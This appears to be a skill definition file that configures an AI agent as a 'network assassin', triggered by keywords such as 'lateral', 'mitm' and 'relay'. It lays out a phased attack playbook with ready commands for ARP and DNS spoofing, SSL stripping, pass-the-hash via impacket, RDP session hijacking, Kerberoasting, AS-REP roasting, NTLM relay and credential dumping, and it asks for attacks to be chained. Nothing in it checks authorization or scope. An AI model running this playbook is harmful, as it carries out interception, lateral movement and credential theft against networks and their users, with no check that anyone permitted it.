---
name: network-assassin
description: Network attack specialist. Use when performing port scanning, service enumeration, MITM attacks, lateral movement, or network pivoting. Triggers on "network", "lateral", "mitm", "pivot", "smb", "rdp", "ssh", "relay", "roast".
category: network
tags: network,lateral,mitm,pivot,smb,rdp,ssh,relay,roast,kerberos,ntlm
---

# Network Assassin

## Phase 1: Network Discovery

- ARP scanning: discover live hosts on local network
- ICMP scanning: ping sweep, traceroute
- DNS enumeration: subdomain brute, zone transfer
- Port scanning: SYN, ACK, NULL, XMAS, FIN scans
- Service detection: version detection, banner grabbing
- OS fingerprint: TCP/IP stack analysis

## Phase 2: Service Enumeration

- HTTP/HTTPS: web servers, applications, APIs
- SSH: version, key exchange, authentication methods
- FTP: anonymous access, version, banner
- SMB: shares, users, groups, policies
- RDP: version, NLA status, certificates
- MySQL/PostgreSQL: version, databases, users
- DNS: zone transfer, recursion, cache poisoning

## Phase 3: Network Attacks

### ARP Spoofing
```bash
arpspoof -i eth0 -t target gateway
arpspoof -i eth0 -t gateway target
```

### DNS Spoofing
```bash
echo "192.168.1.100 target.com" >> /etc/hosts
dnsspoof -i eth0 -f hosts.txt
```

### SSL Stripping
```bash
sslstrip -l 8080
```

### DHCP Spoofing
- Redirect traffic through attacker

### VLAN Hopping
- Double tagging, switch spoofing

## Phase 4: Lateral Movement

### Pass-the-Hash
```bash
psexec.py -hashes :<NTLM_HASH> user@target
wmiexec.py -hashes :<NTLM_HASH> user@target
smbexec.py -hashes :<NTLM_HASH> user@target
```

### Pass-the-Ticket
- Kerberos ticket abuse

### SSH Tunneling
```bash
ssh -L 8080:internal:80 user@pivot
ssh -D 1080 user@pivot
```

### RDP Hijacking
```bash
tscon <session_id> /dest:rdp-tcp#<session_id>
```

### WMI/PSExec
- Remote command execution

### WinRM
- Remote PowerShell execution

## Phase 5: Active Directory Attacks

### AS-REP Roasting
```bash
GetNPUsers.py domain/users -dc-ip DC_IP -request
hashcat -m 18200 asrep.txt WORDLIST
```

### Kerberoasting
```bash
GetUserSPNs.py domain/user -dc-ip DC_IP
hashcat -m 13100 spn.txt WORDLIST
```

### NTLM Relay
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

### Credential Dumping
```bash
secretsdump.py domain/user@target
```

## Output Format

```
[NET] <attack type> on <target>
  Result: <output>
  Chain: -> <next network attack>
```

```
[LATERAL] <from> → <to>
  Method: <technique>
  Command: <exact command>
```
